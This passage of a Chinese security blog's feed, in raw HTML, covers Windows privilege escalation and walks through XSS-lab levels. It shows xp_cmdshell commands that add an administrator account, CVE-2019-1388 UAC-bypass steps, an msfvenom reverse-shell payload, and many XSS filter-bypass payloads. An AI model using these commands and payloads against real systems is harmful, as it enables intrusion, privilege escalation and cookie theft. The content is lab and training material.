style="--shiki-light:#50A14F;--shiki-dark:#98C379">'x'</span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">and</span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD"> name</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">'xp cmdshell'</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">;</span></span></code></pre>
-<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div></li>
-<li>
-<p>开启xp_cmdshell   MSSQL使用xp_cmdshell</p>
-</li>
-<li>
-<p>执行命令创建用户</p>
-<div class="language-sql line-numbers-mode" data-highlighter="shiki" data-ext="sql" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-sql"><span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">exec</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> master</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">.</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">xp_cmdshell</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 'net user youze 123456 /add'</span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">       -- 添加用户ichungiu,密码123.com </span></span>
-<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">exec</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> master</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">.</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">xp_cmdshell</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ' net localgroup administrators youze /add'</span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">       -- 添加ichunqiu到管理员组</span></span></code></pre>
-<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div></div></div></li>
-</ol>
-<h2>3.windows bypass UAC提权</h2>
-<h5>利用CVE-2019-1388实现bypass UAC</h5>
-<p>原理:</p>
-<p>如果在运行一个可执行文件的时候我们<span data-type="text" style="color: var(--b3-font-color8);">触发了 UAC</span>,在点击「展示证书发行者的详细信息」这个链接之后 可以看到证书里的 Issued by 字段,这个字段对应的值就是 OID。证书会解析 OID 的值,可能显示为超链接，但是 Windows 忘记禁用了 OID 处的超链接，这就给了我们提权的可能</p>
-<p>步骤</p>
-<ol>
-<li>
-<p>查看是否打补丁  systeminfo</p>
-</li>
-<li>
-<p>下载EXP:CVE-2019-1388/HHUPD.EXE  这里是开启http服务上传​</p>
-<p>​</p>
-</li>
-<li>
-<p>将exp下载到目标机中，并以管理员权限打开HHUPD.EXE,点击显示详细信息​</p>
-<p>​</p>
-</li>
-<li>
-<p>点击显示详细信息里的   "显示有关此发布者的证书的信息“</p>
-</li>
-<li>
-<p>将弹出的网页"另存为”，弹出位置不可用窗口后点击确定</p>
-</li>
-<li>
-<p>通过在保存网页的文件资源管理器的地址栏输入“C:\windows\system32\cmd.exe”打开cmd  这样才能继承浏览器的SYSTEM权限​</p>
-<p>​</p>
-</li>
-</ol>
-<h5>利用MSF的 bypassuac 模块</h5>
-<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">msfvenom</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -p</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> windows/meterpreter/reverse_tcp</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> lhost=</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">192.168.61.20</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> lport=</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">6666</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -f</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> exe</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -o</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> tests.exe</span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">  #lhostiplport</span></span></code></pre>
-<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><p>​​</p>
-<p>​​</p>
-<p>​​</p>
-<p>​​</p>
-<p>​​</p>
-<p>​​</p>
-<p>​​</p>
-<p>通过一系列的前期渗透测试，已经获得了目标机器的meterpreter shell,当前权限为普通用户权限，可以尝试获取系统的System权限。</p>
-<p>​​</p>
-<h2>4.windows错误系统配置提权</h2>
-<p>...</p>
-<p>‍</p>
-]]></content>
-    <category term="渗透测试"/>
-    <published>2024-09-23T00:00:00.000Z</published>
-  </entry>
-  <entry>
-    <title type="text">XSS-lab靶场闯关详解</title>
-    <id>https://min168.top/perm/XSS-lab%E9%9D%B6%E5%9C%BA%E9%97%AF%E5%85%B3%E8%AF%A6%E8%A7%A3.html</id>
-    <link href="https://min168.top/perm/XSS-lab%E9%9D%B6%E5%9C%BA%E9%97%AF%E5%85%B3%E8%AF%A6%E8%A7%A3.html"/>
-    <updated>2026-07-26T07:49:45.000Z</updated>
-    <summary type="html"><![CDATA[
-<h2>level1</h2>
-<p>payload：</p>
-<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">47.113.187.190:50974/level1.php?name</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">=111</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">&lt;/h2&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;</span></span></code></pre>
-<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div>]]></summary>
-    <content type="html"><![CDATA[
-<h2>level1</h2>
-<p>payload：</p>
-<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">47.113.187.190:50974/level1.php?name</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">=111</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">&lt;/h2&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;</span></span></code></pre>
-<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><p>解析：观察URL发现是GET传参并写入H2里，所以闭合H2标签写js就可。</p>
-<h2>level2</h2>
-<p>观察发现值在value</p>
-<p>​​</p>
-<p>payload：</p>
-<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">111</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">"onclick='javascript:alert(document.cookie)'</span></span></code></pre>
-<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><p>解析：点击输入框后触发事件</p>
-<h2>level3</h2>
-<p>查看值在value</p>
-<p>​​</p>
-<p>输入的&gt;被实体化</p>
-<p>​​</p>
-<p>payload：</p>
-<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">' onfocus=javascript:alert() '</span></span></code></pre>
-<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><p>​​</p>
-<h2>level4</h2>
-<p>111"&gt;   输入发现&gt;被过滤。但是闭合了</p>
-<p>​​</p>
-<p>payload：  点击后被触发。</p>
-<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">111</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">" onclick='javascript:alert()'</span></span></code></pre>
-<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><h2>level5</h2>
-<p>直接输入上方payload</p>
-<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">111</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">" onclick='javascript:alert()'</span></span></code></pre>
-<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><p>on被过滤</p>
-<p>​​</p>
-<p>"&gt;  标签闭合了</p>
-<p>​​</p>
-<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">"&gt;&lt;script&gt;alert()&lt;/script&gt;</span></span></code></pre>
-<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><p>script又被过滤了</p>
-<p>​​</p>
-<p>payload：</p>
-<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">"&gt;&lt;a href=JavaScript:alert()&gt;点我&lt;/a&gt;</span></span></code></pre>
-<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><h2>level6</h2>
-<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">"&gt;&lt;a href=JavaScript:alert()&gt;点我&lt;/a&gt;</span></span></code></pre>
-<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><p>然后href也被过滤了</p>
-<p>​​</p>
-<p>payload：  虽然过滤很多 但是大小写没过滤。</p>
-<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">"&gt;&lt;a hRef=JavaScript:alert()&gt;点我&lt;/a&gt;</span></span></code></pre>
-<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><h2>level7</h2>
-<p>经过前面过滤   <code>"&gt;href script  on </code>​  总结使用这个测试，结果全被过滤了.</p>
-<p>​​</p>
-<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">payload：</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">"&gt;&lt;scrscriptipt&gt;alert()&lt;/scrscriptipt&gt;   那就使用双写呗</span></span>
-<span class="line"></span>
-<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">payload："</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">&gt;&lt;a </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">hrhrefef="javascrscriptipt:alert('XSS')"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">&gt;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">111</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">&lt;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">/</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">a&gt;</span></span></code></pre>
-<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>​​</p>
-<h2>level8</h2>
-<p>''' href  script 被过滤，大写也不行</p>
-<p>​​</p>
-<p>利用href自动Unicode解码</p>
-<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">payload：javascript:alert</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">()      unicode编码后</span></span>
-<span class="line"></span>
-<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">\</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">&amp;</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">\#</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">106;</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">\</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">&amp;</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">\#</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">97;</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">\</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">&amp;</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">\#</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">118;</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">\</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">&amp;</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">\#</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">97;</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">\</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">&amp;</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">\#</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">115;</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">\</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">&amp;</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">\#</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">99;</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">\</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">&amp;</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">\#</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">114;</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">\</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">&amp;</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">\#</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">105;</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">\</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">&amp;</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">\#</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">112;</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">\</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">&amp;</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">\#</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">116;</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">\</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">&amp;</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">\#</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">58;</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">\</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">&amp;</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">\#</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">97;</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">\</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">&amp;</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">\#</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">108;</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">\</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">&amp;</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">\#</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">101;</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">\</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">&amp;</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">\#</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">114;</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">\</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">&amp;</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">\#</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">116;</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">\</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">&amp;</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">\#</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">40;</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">\</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">&amp;</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">\#</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">41;</span></span></code></pre>
-<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>​​</p>
-<h2>level9</h2>
-<p>输入发现被URL编码</p>
-<p>​​</p>
-<p><a href="http://www.runoob.com/" target="_blank" rel="noopener noreferrer">http://www.runoob.com/</a>  输入一个合法链接呢，好像可以跳转。考虑是检测到<a href="http://xn--onqr6jivo" target="_blank" rel="noopener noreferrer">http://才可以</a></p>
-<p>​​</p>
-<p>1.会对特殊字符过滤，需要编码。</p>
-<p>2.需要加入http://</p>
-<p>3.js代码能执行</p>
-<p>4.value先经过URL--&gt;后端校验--&gt;写入href</p>
-<p>5.后端校验时不能有特殊被过滤字符（要编码），要有http://（不能被编码）</p>
-<p>payload：&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#41;http://</p>
-<p>​​</p>
-<p><a href="http://xn--ykq12gc10a6ee" target="_blank" rel="noopener noreferrer">http://检测到了</a>，但也被当作了js，导致js语法不对。</p>
-<p>payload：&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#41;/* http:// */</p>
-<p>​​</p>
-<h2>level10</h2>
-<p>打开没有发现注入点，有三个被隐藏的输入框，但是不知道URL里的参数名，只有input里的name，那后端名称可能和name一样，一个个试试。</p>
-<p>​​</p>
-<p>输入到第三个发现1出现在了value里。</p>
-<p>​​</p>
-<p>?t_sort=1“&gt; On hRef SCRipt  输入前面内容，&gt;被过滤，不能使用标签闭合，大写转小写，但未被过滤。</p>
-<p>​​</p>
-<p>‍</p>
-<p>47.113.187.190:50974/level10.php?t_sort=" onfocus=javascript:alert() type="display"</p>
-<p>将input框display，点击。</p>
-<p>​​</p>
-<h2>level11</h2>
-<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">http://47.113.187.190:50974/level11.php?t_link</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">=1</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">&amp;</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">t_history</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">1</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">&amp;</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">t_sort</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">" onfocus=javascript:alert() type="display"&amp;t_ref=1</span></span></code></pre>
-<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><p>使用10中的方法来做，发现被html编码了，所以这里搞不了。所以考虑referer</p>
-<p>​​</p>
-<p>​​</p>
-<p>注入成功，但是，&lt;&gt;被过滤啦。</p>
-<p>​​</p>
-<p>换个写法</p>
-<p>payload：</p>
-<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">Referer:</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">" onfocus="</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">javascript:alert(</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">)" type="text" "</span></span></code></pre>
-<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><p>​​</p>
-<p>看代码，注入成功。</p>
-<p>​​</p>
-<p>点击输入框执行。</p>
-<p>​​</p>
-<h2>level12</h2>
-<p>这关就和上一关差不多了，所以直接上代码。</p>
-<p>payload：</p>
-<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">" onfocus="</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">javascript:alert(</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">)" type="text" "</span></span></code></pre>
-<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><p>​​</p>
-<p>​​</p>
-<h2>level13</h2>
-<p>cookie，直接修改存储</p>
-<p>payload：</p>
-<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">" onfocus="</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">javascript:alert(</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">)" type="text" "</span></span></code></pre>
-<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><p>​​</p>
-<p>​​</p>
-<h2>level16</h2>
-<p>首先，传参，发现是在center标签里放数据。</p>
-<p>​​</p>
-<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">http://47.113.187.190:50974/level16.php?keyword</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">=</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">&lt;/center&gt;On </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">SCript</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> hREf</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> DaTa</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> OnFocus</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> OnmOuseOver</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> OnMouseDoWn</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> P</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> &lt;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">sCriP</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">t&gt;</span></span></code></pre>
-<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><p>使用该payload测试一下，有哪些过滤。</p>
-<p>​​</p>
-<p>明显发现/、空格、被编码了，script、直接被过滤，有大小写转换。</p>
-<p>1、&lt;&gt;没有过滤</p>
-<p>2、不能使用scrtpt、空格要编码</p>
-<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">payload：?keyword\</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">=</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">\&lt;img%0dsrc</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">\=</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">1%0donerror</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">\=</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">alert(1)</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">\&gt;</span></span>
-<span class="line"></span>
-<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">payload：http://47.113.187.190:50974/level16.php?keyword</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">=</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">&lt;svg </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">onload=alert</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">1</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">)&gt;</span></span></code></pre>
-<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>​​</p>
-<h2>level17</h2>
-<p>有一个插件</p>
-<p>​​</p>
-<p>payload：</p>
